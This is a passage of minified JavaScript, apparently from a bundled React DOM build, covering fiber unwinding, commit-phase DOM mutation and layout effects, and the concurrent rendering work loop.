        n = M.current,
        V(M, r ? n & 1 | 2 : n & 1),
        t) : (ne(t),
        null);
    case 22:
    case 23:
        return zo(),
        r = t.memoizedState !== null,
        e !== null && e.memoizedState !== null !== r && (t.flags |= 8192),
        r && t.mode & 1 ? me & 1073741824 && (ne(t),
        t.subtreeFlags & 6 && (t.flags |= 8192)) : ne(t),
        null;
    case 24:
        return null;
    case 25:
        return null
    }
    throw Error(g(156, t.tag))
}
function hf(e, t) {
    switch (uo(t),
    t.tag) {
    case 1:
        return fe(t.type) && Yr(),
        e = t.flags,
        e & 65536 ? (t.flags = e & -65537 | 128,
        t) : null;
    case 3:
        return nn(),
        I(de),
        I(le),
        vo(),
        e = t.flags,
        e & 65536 && !(e & 128) ? (t.flags = e & -65537 | 128,
        t) : null;
    case 5:
        return yo(t),
        null;
    case 13:
        if (I(M),
        e = t.memoizedState,
        e !== null && e.dehydrated !== null) {
            if (t.alternate === null)
                throw Error(g(340));
            en()
        }
        return e = t.flags,
        e & 65536 ? (t.flags = e & -65537 | 128,
        t) : null;
    case 19:
        return I(M),
        null;
    case 4:
        return nn(),
        null;
    case 10:
        return fo(t.type._context),
        null;
    case 22:
    case 23:
        return zo(),
        null;
    case 24:
        return null;
    default:
        return null
    }
}
var yr = !1
  , re = !1
  , yf = typeof WeakSet == "function" ? WeakSet : Set
  , S = null;
function Dt(e, t) {
    var n = e.ref;
    if (n !== null)
        if (typeof n == "function")
            try {
                n(null)
            } catch (r) {
                Y(e, t, r)
            }
        else
            n.current = null
}
function Pi(e, t, n) {
    try {
        n()
    } catch (r) {
        Y(e, t, r)
    }
}
var Vu = !1;
function vf(e, t) {
    if (hi = Gr,
    e = Hs(),
    io(e)) {
        if ("selectionStart"in e)
            var n = {
                start: e.selectionStart,
                end: e.selectionEnd
            };
        else
            e: {
                n = (n = e.ownerDocument) && n.defaultView || window;
                var r = n.getSelection && n.getSelection();
                if (r && r.rangeCount !== 0) {
                    n = r.anchorNode;
                    var l = r.anchorOffset
                      , i = r.focusNode;
                    r = r.focusOffset;
                    try {
                        n.nodeType,
                        i.nodeType
                    } catch {
                        n = null;
                        break e
                    }
                    var o = 0
                      , u = -1
                      , s = -1
                      , d = 0
                      , y = 0
                      , h = e
                      , m = null;
                    t: for (; ; ) {
                        for (var x; h !== n || l !== 0 && h.nodeType !== 3 || (u = o + l),
                        h !== i || r !== 0 && h.nodeType !== 3 || (s = o + r),
                        h.nodeType === 3 && (o += h.nodeValue.length),
                        (x = h.firstChild) !== null; )
                            m = h,
                            h = x;
                        for (; ; ) {
                            if (h === e)
                                break t;
                            if (m === n && ++d === l && (u = o),
                            m === i && ++y === r && (s = o),
                            (x = h.nextSibling) !== null)
                                break;
                            h = m,
                            m = h.parentNode
                        }
                        h = x
                    }
                    n = u === -1 || s === -1 ? null : {
                        start: u,
                        end: s
                    }
                } else
                    n = null
            }
        n = n || {
            start: 0,
            end: 0
        }
    } else
        n = null;
    for (yi = {
        focusedElem: e,
        selectionRange: n
    },
    Gr = !1,
    S = t; S !== null; )
        if (t = S,
        e = t.child,
        (t.subtreeFlags & 1028) !== 0 && e !== null)
            e.return = t,
            S = e;
        else
            for (; S !== null; ) {
                t = S;
                try {
                    var k = t.alternate;
                    if (t.flags & 1024)
                        switch (t.tag) {
                        case 0:
                        case 11:
                        case 15:
                            break;
                        case 1:
                            if (k !== null) {
                                var w = k.memoizedProps
                                  , F = k.memoizedState
                                  , f = t.stateNode
                                  , a = f.getSnapshotBeforeUpdate(t.elementType === t.type ? w : Te(t.type, w), F);
                                f.__reactInternalSnapshotBeforeUpdate = a
                            }
                            break;
                        case 3:
                            var p = t.stateNode.containerInfo;
                            p.nodeType === 1 ? p.textContent = "" : p.nodeType === 9 && p.documentElement && p.removeChild(p.documentElement);
                            break;
                        case 5:
                        case 6:
                        case 4:
                        case 17:
                            break;
                        default:
                            throw Error(g(163))
                        }
                } catch (v) {
                    Y(t, t.return, v)
                }
                if (e = t.sibling,
                e !== null) {
                    e.return = t.return,
                    S = e;
                    break
                }
                S = t.return
            }
    return k = Vu,
    Vu = !1,
    k
}
function Tn(e, t, n) {
    var r = t.updateQueue;
    if (r = r !== null ? r.lastEffect : null,
    r !== null) {
        var l = r = r.next;
        do {
            if ((l.tag & e) === e) {
                var i = l.destroy;
                l.destroy = void 0,
                i !== void 0 && Pi(t, n, i)
            }
            l = l.next
        } while (l !== r)
    }
}
function fl(e, t) {
    if (t = t.updateQueue,
    t = t !== null ? t.lastEffect : null,
    t !== null) {
        var n = t = t.next;
        do {
            if ((n.tag & e) === e) {
                var r = n.create;
                n.destroy = r()
            }
            n = n.next
        } while (n !== t)
    }
}
function Li(e) {
    var t = e.ref;
    if (t !== null) {
        var n = e.stateNode;
        switch (e.tag) {
        case 5:
            e = n;
            break;
        default:
            e = n
        }
        typeof t == "function" ? t(e) : t.current = e
    }
}
function Ya(e) {
    var t = e.alternate;
    t !== null && (e.alternate = null,
    Ya(t)),
    e.child = null,
    e.deletions = null,
    e.sibling = null,
    e.tag === 5 && (t = e.stateNode,
    t !== null && (delete t[Fe],
    delete t[Yn],
    delete t[xi],
    delete t[bd],
    delete t[qd])),
    e.stateNode = null,
    e.return = null,
    e.dependencies = null,
    e.memoizedProps = null,
    e.memoizedState = null,
    e.pendingProps = null,
    e.stateNode = null,
    e.updateQueue = null
}
function Ua(e) {
    return e.tag === 5 || e.tag === 3 || e.tag === 4
}
function Wu(e) {
    e: for (; ; ) {
        for (; e.sibling === null; ) {
            if (e.return === null || Ua(e.return))
                return null;
            e = e.return
        }
        for (e.sibling.return = e.return,
        e = e.sibling; e.tag !== 5 && e.tag !== 6 && e.tag !== 18; ) {
            if (e.flags & 2 || e.child === null || e.tag === 4)
                continue e;
            e.child.return = e,
            e = e.child
        }
        if (!(e.flags & 2))
            return e.stateNode
    }
}
function Vi(e, t, n) {
    var r = e.tag;
    if (r === 5 || r === 6)
        e = e.stateNode,
        t ? n.nodeType === 8 ? n.parentNode.insertBefore(e, t) : n.insertBefore(e, t) : (n.nodeType === 8 ? (t = n.parentNode,
        t.insertBefore(e, n)) : (t = n,
        t.appendChild(e)),
        n = n._reactRootContainer,
        n != null || t.onclick !== null || (t.onclick = Xr));
    else if (r !== 4 && (e = e.child,
    e !== null))
        for (Vi(e, t, n),
        e = e.sibling; e !== null; )
            Vi(e, t, n),
            e = e.sibling
}
function Wi(e, t, n) {
    var r = e.tag;
    if (r === 5 || r === 6)
        e = e.stateNode,
        t ? n.insertBefore(e, t) : n.appendChild(e);
    else if (r !== 4 && (e = e.child,
    e !== null))
        for (Wi(e, t, n),
        e = e.sibling; e !== null; )
            Wi(e, t, n),
            e = e.sibling
}
var b = null
  , Re = !1;
function $e(e, t, n) {
    for (n = n.child; n !== null; )
        Da(e, t, n),
        n = n.sibling
}
function Da(e, t, n) {
    if (Me && typeof Me.onCommitFiberUnmount == "function")
        try {
            Me.onCommitFiberUnmount(ll, n)
        } catch {}
    switch (n.tag) {
    case 5:
        re || Dt(n, t);
    case 6:
        var r = b
          , l = Re;
        b = null,
        $e(e, t, n),
        b = r,
        Re = l,
        b !== null && (Re ? (e = b,
        n = n.stateNode,
        e.nodeType === 8 ? e.parentNode.removeChild(n) : e.removeChild(n)) : b.removeChild(n.stateNode));
        break;
    case 18:
        b !== null && (Re ? (e = b,
        n = n.stateNode,
        e.nodeType === 8 ? Gl(e.parentNode, n) : e.nodeType === 1 && Gl(e, n),
        Fn(e)) : Gl(b, n.stateNode));
        break;
    case 4:
        r = b,
        l = Re,
        b = n.stateNode.containerInfo,
        Re = !0,
        $e(e, t, n),
        b = r,
        Re = l;
        break;
    case 0:
    case 11:
    case 14:
    case 15:
        if (!re && (r = n.updateQueue,
        r !== null && (r = r.lastEffect,
        r !== null))) {
            l = r = r.next;
            do {
                var i = l
                  , o = i.destroy;
                i = i.tag,
                o !== void 0 && (i & 2 || i & 4) && Pi(n, t, o),
                l = l.next
            } while (l !== r)
        }
        $e(e, t, n);
        break;
    case 1:
        if (!re && (Dt(n, t),
        r = n.stateNode,
        typeof r.componentWillUnmount == "function"))
            try {
                r.props = n.memoizedProps,
                r.state = n.memoizedState,
                r.componentWillUnmount()
            } catch (u) {
                Y(n, t, u)
            }
        $e(e, t, n);
        break;
    case 21:
        $e(e, t, n);
        break;
    case 22:
        n.mode & 1 ? (re = (r = re) || n.memoizedState !== null,
        $e(e, t, n),
        re = r) : $e(e, t, n);
        break;
    default:
        $e(e, t, n)
    }
}
function Iu(e) {
    var t = e.updateQueue;
    if (t !== null) {
        e.updateQueue = null;
        var n = e.stateNode;
        n === null && (n = e.stateNode = new yf),
        t.forEach(function(r) {
            var l = Ef.bind(null, e, r);
            n.has(r) || (n.add(r),
            r.then(l, l))
        })
    }
}
function ze(e, t) {
    var n = t.deletions;
    if (n !== null)
        for (var r = 0; r < n.length; r++) {
            var l = n[r];
            try {
                var i = e
                  , o = t
                  , u = o;
                e: for (; u !== null; ) {
                    switch (u.tag) {
                    case 5:
                        b = u.stateNode,
                        Re = !1;
                        break e;
                    case 3:
                        b = u.stateNode.containerInfo,
                        Re = !0;
                        break e;
                    case 4:
                        b = u.stateNode.containerInfo,
                        Re = !0;
                        break e
                    }
                    u = u.return
                }
                if (b === null)
                    throw Error(g(160));
                Da(i, o, l),
                b = null,
                Re = !1;
                var s = l.alternate;
                s !== null && (s.return = null),
                l.return = null
            } catch (d) {
                Y(l, t, d)
            }
        }
    if (t.subtreeFlags & 12854)
        for (t = t.child; t !== null; )
            Ba(t, e),
            t = t.sibling
}
function Ba(e, t) {
    var n = e.alternate
      , r = e.flags;
    switch (e.tag) {
    case 0:
    case 11:
    case 14:
    case 15:
        if (ze(t, e),
        We(e),
        r & 4) {
            try {
                Tn(3, e, e.return),
                fl(3, e)
            } catch (w) {
                Y(e, e.return, w)
            }
            try {
                Tn(5, e, e.return)
            } catch (w) {
                Y(e, e.return, w)
            }
        }
        break;
    case 1:
        ze(t, e),
        We(e),
        r & 512 && n !== null && Dt(n, n.return);
        break;
    case 5:
        if (ze(t, e),
        We(e),
        r & 512 && n !== null && Dt(n, n.return),
        e.flags & 32) {
            var l = e.stateNode;
            try {
                Ln(l, "")
            } catch (w) {
                Y(e, e.return, w)
            }
        }
        if (r & 4 && (l = e.stateNode,
        l != null)) {
            var i = e.memoizedProps
              , o = n !== null ? n.memoizedProps : i
              , u = e.type
              , s = e.updateQueue;
            if (e.updateQueue = null,
            s !== null)
                try {
                    u === "input" && i.type === "radio" && i.name != null && ps(l, i),
                    ii(u, o);
                    var d = ii(u, i);
                    for (o = 0; o < s.length; o += 2) {
                        var y = s[o]
                          , h = s[o + 1];
                        y === "style" ? gs(l, h) : y === "dangerouslySetInnerHTML" ? ys(l, h) : y === "children" ? Ln(l, h) : Hi(l, y, h, d)
                    }
                    switch (u) {
                    case "input":
                        ei(l, i);
                        break;
                    case "textarea":
                        ms(l, i);
                        break;
                    case "select":
                        var m = l._wrapperState.wasMultiple;
                        l._wrapperState.wasMultiple = !!i.multiple;
                        var x = i.value;
                        x != null ? Ht(l, !!i.multiple, x, !1) : m !== !!i.multiple && (i.defaultValue != null ? Ht(l, !!i.multiple, i.defaultValue, !0) : Ht(l, !!i.multiple, i.multiple ? [] : "", !1))
                    }
                    l[Yn] = i
                } catch (w) {
                    Y(e, e.return, w)
                }
        }
        break;
    case 6:
        if (ze(t, e),
        We(e),
        r & 4) {
            if (e.stateNode === null)
                throw Error(g(162));
            l = e.stateNode,
            i = e.memoizedProps;
            try {
                l.nodeValue = i
            } catch (w) {
                Y(e, e.return, w)
            }
        }
        break;
    case 3:
        if (ze(t, e),
        We(e),
        r & 4 && n !== null && n.memoizedState.isDehydrated)
            try {
                Fn(t.containerInfo)
            } catch (w) {
                Y(e, e.return, w)
            }
        break;
    case 4:
        ze(t, e),
        We(e);
        break;
    case 13:
        ze(t, e),
        We(e),
        l = e.child,
        l.flags & 8192 && (i = l.memoizedState !== null,
        l.stateNode.isHidden = i,
        !i || l.alternate !== null && l.alternate.memoizedState !== null || (Eo = B())),
        r & 4 && Iu(e);
        break;
    case 22:
        if (y = n !== null && n.memoizedState !== null,
        e.mode & 1 ? (re = (d = re) || y,
        ze(t, e),
        re = d) : ze(t, e),
        We(e),
        r & 8192) {
            if (d = e.memoizedState !== null,
            (e.stateNode.isHidden = d) && !y && e.mode & 1)
                for (S = e,
                y = e.child; y !== null; ) {
                    for (h = S = y; S !== null; ) {
                        switch (m = S,
                        x = m.child,
                        m.tag) {
                        case 0:
                        case 11:
                        case 14:
                        case 15:
                            Tn(4, m, m.return);
                            break;
                        case 1:
                            Dt(m, m.return);
                            var k = m.stateNode;
                            if (typeof k.componentWillUnmount == "function") {
                                r = m,
                                n = m.return;
                                try {
                                    t = r,
                                    k.props = t.memoizedProps,
                                    k.state = t.memoizedState,
                                    k.componentWillUnmount()
                                } catch (w) {
                                    Y(r, n, w)
                                }
                            }
                            break;
                        case 5:
                            Dt(m, m.return);
                            break;
                        case 22:
                            if (m.memoizedState !== null) {
                                Gu(h);
                                continue
                            }
                        }
                        x !== null ? (x.return = m,
                        S = x) : Gu(h)
                    }
                    y = y.sibling
                }
            e: for (y = null,
            h = e; ; ) {
                if (h.tag === 5) {
                    if (y === null) {
                        y = h;
                        try {
                            l = h.stateNode,
                            d ? (i = l.style,
                            typeof i.setProperty == "function" ? i.setProperty("display", "none", "important") : i.display = "none") : (u = h.stateNode,
                            s = h.memoizedProps.style,
                            o = s != null && s.hasOwnProperty("display") ? s.display : null,
                            u.style.display = vs("display", o))
                        } catch (w) {
                            Y(e, e.return, w)
                        }
                    }
                } else if (h.tag === 6) {
                    if (y === null)
                        try {
                            h.stateNode.nodeValue = d ? "" : h.memoizedProps
                        } catch (w) {
                            Y(e, e.return, w)
                        }
                } else if ((h.tag !== 22 && h.tag !== 23 || h.memoizedState === null || h === e) && h.child !== null) {
                    h.child.return = h,
                    h = h.child;
                    continue
                }
                if (h === e)
                    break e;
                for (; h.sibling === null; ) {
                    if (h.return === null || h.return === e)
                        break e;
                    y === h && (y = null),
                    h = h.return
                }
                y === h && (y = null),
                h.sibling.return = h.return,
                h = h.sibling
            }
        }
        break;
    case 19:
        ze(t, e),
        We(e),
        r & 4 && Iu(e);
        break;
    case 21:
        break;
    default:
        ze(t, e),
        We(e)
    }
}
function We(e) {
    var t = e.flags;
    if (t & 2) {
        try {
            e: {
                for (var n = e.return; n !== null; ) {
                    if (Ua(n)) {
                        var r = n;
                        break e
                    }
                    n = n.return
                }
                throw Error(g(160))
            }
            switch (r.tag) {
            case 5:
                var l = r.stateNode;
                r.flags & 32 && (Ln(l, ""),
                r.flags &= -33);
                var i = Wu(e);
                Wi(e, i, l);
                break;
            case 3:
            case 4:
                var o = r.stateNode.containerInfo
                  , u = Wu(e);
                Vi(e, u, o);
                break;
            default:
                throw Error(g(161))
            }
        } catch (s) {
            Y(e, e.return, s)
        }
        e.flags &= -3
    }
    t & 4096 && (e.flags &= -4097)
}
function gf(e, t, n) {
    S = e,
    Ha(e)
}
function Ha(e, t, n) {
    for (var r = (e.mode & 1) !== 0; S !== null; ) {
        var l = S
          , i = l.child;
        if (l.tag === 22 && r) {
            var o = l.memoizedState !== null || yr;
            if (!o) {
                var u = l.alternate
                  , s = u !== null && u.memoizedState !== null || re;
                u = yr;
                var d = re;
                if (yr = o,
                (re = s) && !d)
                    for (S = l; S !== null; )
                        o = S,
                        s = o.child,
                        o.tag === 22 && o.memoizedState !== null ? Mu(l) : s !== null ? (s.return = o,
                        S = s) : Mu(l);
                for (; i !== null; )
                    S = i,
                    Ha(i),
                    i = i.sibling;
                S = l,
                yr = u,
                re = d
            }
            Fu(e)
        } else
            l.subtreeFlags & 8772 && i !== null ? (i.return = l,
            S = i) : Fu(e)
    }
}
function Fu(e) {
    for (; S !== null; ) {
        var t = S;
        if (t.flags & 8772) {
            var n = t.alternate;
            try {
                if (t.flags & 8772)
                    switch (t.tag) {
                    case 0:
                    case 11:
                    case 15:
                        re || fl(5, t);
                        break;
                    case 1:
                        var r = t.stateNode;
                        if (t.flags & 4 && !re)
                            if (n === null)
                                r.componentDidMount();
                            else {
                                var l = t.elementType === t.type ? n.memoizedProps : Te(t.type, n.memoizedProps);
                                r.componentDidUpdate(l, n.memoizedState, r.__reactInternalSnapshotBeforeUpdate)
                            }
                        var i = t.updateQueue;
                        i !== null && wu(t, i, r);
                        break;
                    case 3:
                        var o = t.updateQueue;
                        if (o !== null) {
                            if (n = null,
                            t.child !== null)
                                switch (t.child.tag) {
                                case 5:
                                    n = t.child.stateNode;
                                    break;
                                case 1:
                                    n = t.child.stateNode
                                }
                            wu(t, o, n)
                        }
                        break;
                    case 5:
                        var u = t.stateNode;
                        if (n === null && t.flags & 4) {
                            n = u;
                            var s = t.memoizedProps;
                            switch (t.type) {
                            case "button":
                            case "input":
                            case "select":
                            case "textarea":
                                s.autoFocus && n.focus();
                                break;
                            case "img":
                                s.src && (n.src = s.src)
                            }
                        }
                        break;
                    case 6:
                        break;
                    case 4:
                        break;
                    case 12:
                        break;
                    case 13:
                        if (t.memoizedState === null) {
                            var d = t.alternate;
                            if (d !== null) {
                                var y = d.memoizedState;
                                if (y !== null) {
                                    var h = y.dehydrated;
                                    h !== null && Fn(h)
                                }
                            }
                        }
                        break;
                    case 19:
                    case 17:
                    case 21:
                    case 22:
                    case 23:
                    case 25:
                        break;
                    default:
                        throw Error(g(163))
                    }
                re || t.flags & 512 && Li(t)
            } catch (m) {
                Y(t, t.return, m)
            }
        }
        if (t === e) {
            S = null;
            break
        }
        if (n = t.sibling,
        n !== null) {
            n.return = t.return,
            S = n;
            break
        }
        S = t.return
    }
}
function Gu(e) {
    for (; S !== null; ) {
        var t = S;
        if (t === e) {
            S = null;
            break
        }
        var n = t.sibling;
        if (n !== null) {
            n.return = t.return,
            S = n;
            break
        }
        S = t.return
    }
}
function Mu(e) {
    for (; S !== null; ) {
        var t = S;
        try {
            switch (t.tag) {
            case 0:
            case 11:
            case 15:
                var n = t.return;
                try {
                    fl(4, t)
                } catch (s) {
                    Y(t, n, s)
                }
                break;
            case 1:
                var r = t.stateNode;
                if (typeof r.componentDidMount == "function") {
                    var l = t.return;
                    try {
                        r.componentDidMount()
                    } catch (s) {
                        Y(t, l, s)
                    }
                }
                var i = t.return;
                try {
                    Li(t)
                } catch (s) {
                    Y(t, i, s)
                }
                break;
            case 5:
                var o = t.return;
                try {
                    Li(t)
                } catch (s) {
                    Y(t, o, s)
                }
            }
        } catch (s) {
            Y(t, t.return, s)
        }
        if (t === e) {
            S = null;
            break
        }
        var u = t.sibling;
        if (u !== null) {
            u.return = t.return,
            S = u;
            break
        }
        S = t.return
    }
}
var xf = Math.ceil
  , br = Ae.ReactCurrentDispatcher
  , Co = Ae.ReactCurrentOwner
  , Ce = Ae.ReactCurrentBatchConfig
  , P = 0
  , $ = null
  , H = null
  , q = 0
  , me = 0
  , Bt = ht(0)
  , K = 0
  , Kn = null
  , Tt = 0
  , pl = 0
  , jo = 0
  , Rn = null
  , ae = null
  , Eo = 0
  , ln = 1 / 0
  , Xe = null
  , qr = !1
  , Ii = null
  , at = null
  , vr = !1
  , rt = null
  , el = 0
  , _n = 0
  , Fi = null
  , Rr = -1
  , _r = 0;
function oe() {
    return P & 6 ? B() : Rr !== -1 ? Rr : Rr = B()
}
function ct(e) {
    return e.mode & 1 ? P & 2 && q !== 0 ? q & -q : tf.transition !== null ? (_r === 0 && (_r = Rs()),
    _r) : (e = L,
    e !== 0 || (e = window.event,
    e = e === void 0 ? 16 : Fs(e.type)),
    e) : 1
}
function Le(e, t, n, r) {
    if (50 < _n)
        throw _n = 0,
        Fi = null,
        Error(g(185));
    An(e, n, r),
    (!(P & 2) || e !== $) && (e === $ && (!(P & 2) && (pl |= n),
    K === 4 && tt(e, q)),
    pe(e, r),
    n === 1 && P === 0 && !(t.mode & 1) && (ln = B() + 500,
    al && yt()))
}
function pe(e, t) {
    var n = e.callbackNode;
    td(e, t);
    var r = Fr(e, e === $ ? q : 0);
    if (r === 0)
        n !== null && Ko(n),
        e.callbackNode = null,
        e.callbackPriority = 0;
    else if (t = r & -r,
    e.callbackPriority !== t) {
        if (n != null && Ko(n),
        t === 1)
            e.tag === 0 ? ef(Ou.bind(null, e)) : na(Ou.bind(null, e)),
            Ad(function() {
                !(P & 6) && yt()
            }),
            n = null;
        else {
            switch (_s(r)) {
            case 1:
                n = $i;
                break;
            case 4:
                n = zs;
                break;
            case 16:
                n = Ir;
                break;
            case 536870912:
                n = Ts;
                break;
            default:
                n = Ir
            }
            n = ec(n, Ja.bind(null, e))
        }
        e.callbackPriority = t,
        e.callbackNode = n
    }
}
function Ja(e, t) {
    if (Rr = -1,
    _r = 0,
    P & 6)
        throw Error(g(327));
    var n = e.callbackNode;
    if ($t() && e.callbackNode !== n)
        return null;
    var r = Fr(e, e === $ ? q : 0);
    if (r === 0)
        return null;
    if (r & 30 || r & e.expiredLanes || t)
        t = tl(e, r);
    else {
        t = r;
        var l = P;
        P |= 2;
        var i = Qa();
        ($ !== e || q !== t) && (Xe = null,
        ln = B() + 500,
        Ct(e, t));
        do
            try {
                Sf();
                break
            } catch (u) {
                Ka(e, u)
            }
        while (!0);
        co(),
        br.current = i,
        P = l,
        H !== null ? t = 0 : ($ = null,
        q = 0,
        t = K)
    }
    if (t !== 0) {
        if (t === 2 && (l = ci(e),
        l !== 0 && (r = l,
        t = Gi(e, l))),
        t === 1)
            throw n = Kn,
            Ct(e, 0),
            tt(e, r),
            pe(e, B()),
            n;
        if (t === 6)
            tt(e, r);
        else {
            if (l = e.current.alternate,
            !(r & 30) && !kf(l) && (t = tl(e, r),
            t === 2 && (i = ci(e),
            i !== 0 && (r = i,
            t = Gi(e, i))),
            t === 1))
                throw n = Kn,
                Ct(e, 0),
                tt(e, r),
                pe(e, B()),
                n;
            switch (e.finishedWork = l,
            e.finishedLanes = r,
            t) {
            case 0:
            case 1:
                throw Error(g(345));
            case 2:
                kt(e, ae, Xe);
                break;
            case 3:
                if (tt(e, r),
                (r & 130023424) === r && (t = Eo + 500 - B(),
                10 < t)) {
                    if (Fr(e, 0) !== 0)
                        break;
                    if (l = e.suspendedLanes,
                    (l & r) !== r) {
                        oe(),
                        e.pingedLanes |= e.suspendedLanes & l;
                        break
                    }
                    e.timeoutHandle = gi(kt.bind(null, e, ae, Xe), t);
                    break
                }
                kt(e, ae, Xe);
                break;
            case 4:
                if (tt(e, r),
                (r & 4194240) === r)
                    break;
                for (t = e.eventTimes,
                l = -1; 0 < r; ) {
                    var o = 31 - Pe(r);
                    i = 1 << o,
                    o = t[o],
                    o > l && (l = o),
                    r &= ~i
                }
                if (r = l,
                r = B() - r,
                r = (120 > r ? 120 : 480 > r ? 480 : 1080 > r ? 1080 : 1920 > r ? 1920 : 3e3 > r ? 3e3 : 4320 > r ? 4320 : 1960 * xf(r / 1960)) - r,
                10 < r) {
                    e.timeoutHandle = gi(kt.bind(null, e, ae, Xe), r);
                    break
                }
                kt(e, ae, Xe);
                break;
            case 5:
                kt(e, ae, Xe);
                break;
            default:
                throw Error(g(329))
            }
        }
    }
    return pe(e, B()),
    e.callbackNode === n ? Ja.bind(null, e) : null
}
function Gi(e, t) {
    var n = Rn;
    return e.current.memoizedState.isDehydrated && (Ct(e, t).flags |= 256),
    e = tl(e, t),
    e !== 2 && (t = ae,
    ae = n,
    t !== null && Mi(t)),
    e
}
function Mi(e) {
    ae === null ? ae = e : ae.push.apply(ae, e)
}
function kf(e) {
    for (var t = e; ; ) {
        if (t.flags & 16384) {
            var n = t.updateQueue;
            if (n !== null && (n = n.stores,
            n !== null))
                for (var r = 0; r < n.length; r++) {
                    var l = n[r]
                      , i = l.getSnapshot;
                    l = l.value;
                    try {
                        if (!Ve(i(), l))
                            return !1
                    } catch {
                        return !1
                    }
                }
        }
        if (n = t.child,
        t.subtreeFlags & 16384 && n !== null)
            n.return = t,
            t = n;
        else {
            if (t === e)
                break;
            for (; t.sibling === null; ) {
                if (t.return === null || t.return === e)
                    return !0;
                t = t.return
            }
            t.sibling.return = t.return,
            t = t.sibling
        }
    }
    return !0
}
function tt(e, t) {
    for (t &= ~jo,
    t &= ~pl,
    e.suspendedLanes |= t,
    e.pingedLanes &= ~t,
    e = e.expirationTimes; 0 < t; ) {
        var n = 31 - Pe(t)
          , r = 1 << n;
        e[n] = -1,
        t &= ~r
    }
}
function Ou(e) {
    if (P & 6)
        throw Error(g(327));
    $t();
    var t = Fr(e, 0);
    if (!(t & 1))
        return pe(e, B()),
        null;
    var n = tl(e, t);
    if (e.tag !== 0 && n === 2) {
        var r = ci(e);
        r !== 0 && (t = r,
        n = Gi(e, r))
    }
    if (n === 1)
        throw n = Kn,
        Ct(e, 0),
        tt(e, t),
        pe(e, B()),
        n;
    if (n === 6)
        throw Error(g(345));
    return e.finishedWork = e.current.alternate,
    e.finishedLanes = t,
    kt(e, ae, Xe),
    pe(e, B()),
    null
}
function Zo(e, t) {
    var n = P;
    P |= 1;
    try {
        return e(t)
    } finally {
        P = n,
        P === 0 && (ln = B() + 500,
        al && yt())
    }
}
function Rt(e) {
    rt !== null && rt.tag === 0 && !(P & 6) && $t();
    var t = P;
    P |= 1;
    var n = Ce.transition
      , r = L;
    try {
        if (Ce.transition = null,
        L = 1,
        e)
            return e()
    } finally {
        L = r,
        Ce.transition = n,
        P = t,
        !(P & 6) && yt()
    }
}
function zo() {
    me = Bt.current,
    I(Bt)
}
function Ct(e, t) {
    e.finishedWork = null,
    e.finishedLanes = 0;
    var n = e.timeoutHandle;
    if (n !== -1 && (e.timeoutHandle = -1,
    Qd(n)),
    H !== null)
        for (n = H.return; n !== null; ) {
            var r = n;
            switch (uo(r),
            r.tag) {
            case 1:
                r = r.type.childContextTypes,
                r != null && Yr();
                break;
            case 3:
                nn(),
                I(de),
                I(le),
                vo();
                break;
            case 5:
                yo(r);
                break;
            case 4:
                nn();
                break;
            case 13:
                I(M);
                break;
            case 19:
                I(M);
                break;
            case 10:
                fo(r.type._context);
                break;
            case 22:
            case 23:
                zo()
            }
            n = n.return
        }
    if ($ = e,
    H = e = dt(e.current, null),
    q = me = t,
    K = 0,
    Kn = null,
    jo = pl = Tt = 0,
    ae = Rn = null,
    St !== null) {
        for (t = 0; t < St.length; t++)
            if (n = St[t],
            r = n.interleaved,
            r !== null) {
                n.interleaved = null;
                var l = r.next
                  , i = n.pending;
                if (i !== null) {
                    var o = i.next;
                    i.next = l,
                    r.next = o
                }
                n.pending = r
            }
        St = null
    }
    return e
}
function Ka(e, t) {
    do {
        var n = H;
        try {
            if (co(),
            Zr.current = $r,
            Ar) {
                for (var r = O.memoizedState; r !== null; ) {
                    var l = r.queue;
                    l !== null && (l.pending = null),
                    r = r.next
                }
                Ar = !1
            }
            if (zt = 0,
            A = J = O = null,
            zn = !1,
            Bn = 0,
            Co.current = null,
            n === null || n.return === null) {
                K = 1,
                Kn = t,
                H = null;
                break
            }
            e: {
                var i = e
                  , o = n.return
                  , u = n
                  , s = t;
                if (t = q,
                u.flags |= 32768,
                s !== null && typeof s == "object" && typeof s.then == "function") {
                    var d = s
                      , y = u
                      , h = y.tag;
                    if (!(y.mode & 1) && (h === 0 || h === 11 || h === 15)) {
                        var m = y.alternate;
                        m ? (y.updateQueue = m.updateQueue,
                        y.memoizedState = m.memoizedState,
                        y.lanes = m.lanes) : (y.updateQueue = null,
                        y.memoizedState = null)
                    }
                    var x = Zu(o);
                    if (x !== null) {
                        x.flags &= -257,
                        zu(x, o, u, i, t),
                        x.mode & 1 && Eu(i, d, t),
                        t = x,
                        s = d;
                        var k = t.updateQueue;
                        if (k === null) {
                            var w = new Set;
                            w.add(s),
                            t.updateQueue = w
                        } else
                            k.add(s);
                        break e
                    } else {
                        if (!(t & 1)) {
                            Eu(i, d, t),
                            To();
                            break e
                        }
                        s = Error(g(426))
                    }
                } else if (G && u.mode & 1) {
                    var F = Zu(o);
                    if (F !== null) {
                        !(F.flags & 65536) && (F.flags |= 256),
                        zu(F, o, u, i, t),
                        so(rn(s, u));
                        break e
                    }
                }
                i = s = rn(s, u),
                K !== 4 && (K = 2),
                Rn === null ? Rn = [i] : Rn.push(i),
                i = o;
                do {
                    switch (i.tag) {
                    case 3:
                        i.flags |= 65536,
                        t &= -t,
                        i.lanes |= t;
                        var f = _a(i, s, t);
                        ku(i, f);
                        break e;
                    case 1:
                        u = s;
                        var a = i.type
                          , p = i.stateNode;
                        if (!(i.flags & 128) && (typeof a.getDerivedStateFromError == "function" || p !== null && typeof p.componentDidCatch == "function" && (at === null || !at.has(p)))) {
                            i.flags |= 65536,
                            t &= -t,
                            i.lanes |= t;
                            var v = Pa(i, u, t);
                            ku(i, v);
                            break e
                        }
                    }
                    i = i.return
                } while (i !== null)
            }
            $a(n)
        } catch (N) {
            t = N,
            H === n && n !== null && (H = n = n.return);
            continue
        }
        break
    } while (!0)
}
function Qa() {
    var e = br.current;
    return br.current = $r,
    e === null ? $r : e
}
function To() {
    (K === 0 || K === 3 || K === 2) && (K = 4),
    $ === null || !(Tt & 268435455) && !(pl & 268435455) || tt($, q)
}
function tl(e, t) {
    var n = P;
    P |= 2;
    var r = Qa();
    ($ !== e || q !== t) && (Xe = null,
    Ct(e, t));
    do
        try {
            wf();
            break
        } catch (l) {
            Ka(e, l)
        }
    while (!0);
    if (co(),
    P = n,
    br.current = r,
    H !== null)
        throw Error(g(261));
    return $ = null,
    q = 0,
    K
}
function wf() {
    for (; H !== null; )
        Aa(H)
}
function Sf() {
    for (; H !== null && !Hc(); )
        Aa(H)
}
function Aa(e) {
    var t = qa(e.alternate, e, me);
    e.memoizedProps = e.pendingProps,
    t === null ? $a(e) : H = t,
    Co.current = null
}
